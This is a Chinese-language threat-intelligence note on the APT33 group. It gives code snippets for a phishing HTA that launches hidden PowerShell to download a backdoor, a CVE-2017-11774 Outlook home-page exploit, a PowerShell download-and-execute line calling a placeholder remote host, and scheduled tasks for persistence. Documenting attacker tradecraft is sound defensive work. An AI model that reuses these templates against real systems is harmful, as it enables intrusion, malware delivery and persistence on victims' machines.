# APT33

## 特征

1. 发送钓鱼邮件时，会包含指向恶意HTA（HTML Application，HTML应用程序）文件的链接，该HTA文件会下载该组织的后门.

```HTA
# Please Wait. Loading ...
<h1>Please Wait. Loading ...</h1>
<head>
<title>Supply Specialist , Riyadh,Alsalam Aircraft Company</title>
</head>

'''
 <script>
a=new ActiveXObject("WScript.Shell");
a.run(‘%windir%\\System32\\cmd.exe /c powershell -window hidden -enc 编码后命令', 0);
//调用PowerShell下载后门
</script>

'''
```

2. 通过设置Outlook主页使用安全绕过漏洞（CVE-2017-11774）来使目标下载恶意文件.

```html
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Outlook</title>
<script id=clientEventHandlersVBS language=vbscript>
<!--
  Sub window_onload()
         Set Application = ViewCtll.OutlookApplication
         Set cmd = Application.CreateObject("Wscript.shell')
         //创建Wscript.shell类型对象
         cmd.Run "cmd /c powershell.exe-w l -noni -nop -en  base64加密命令", 0, True
         //使用PowerShell下载后门
  End sub
-->
</script>
</head>

<body>
  <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
  //嵌入对象OutlookViewCtl CLSID
</body>
</html>
```

3. 在钓鱼邮件里写入恶意Url地址，当受害者点击时会下载HTA文件，该文件会下载chfeeds.vbe来充当下载器.

```HTA
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('https://IP地址:端口/chfeeds.vbe');
```

4. 通过JavaScript命令来使用schtasks创建计划任务（如代码清单1.19所示），该计划任务会每天定点执行chfeeds.vbe下载.

```JavaScript
a.	run('%windir%\\System32\\cmd.exe /c PowerShell -window hidden schtasks.exe /CREATE /SC DAILY /TN "1" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 01:00 /f
//创建一个计划任务名为1，每天1:00时间运行chfeeds.vbe的计划任务
&& schtasks.exe /CREATE /SC DAILY /TN "3" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 03:00 /f && schtasks.exe /CREATE /SC DAILY /TN "5" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 05:00 /f && schtasks.exe /CREATE /SC DAILY /TN "7" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 07:00 /f && schtasks.exe /CREATE /SC DAILY /TN "9" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 09:00 /f && schtasks.exe /CREATE /SC DAILY /TN "11" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 11:00 /f && schtasks.exe /CREATE /SC DAILY /TN "13" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 13:00 /f && schtasks.exe /CREATE /SC DAILY /TN "15" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 15:00 /f && schtasks.exe /CREATE /SC DAILY /TN "17" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 17:00 /f && schtasks.exe /CREATE /SC DAILY /TN "19" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 19:00 /f && schtasks.exe /CREATE /SC DAILY /TN "21" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 21:00 /f && schtasks.exe /CREATE /SC DAILY /TN "23" /TR "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds\\chfeeds.vbe" /ST 23:00 /f ')
```
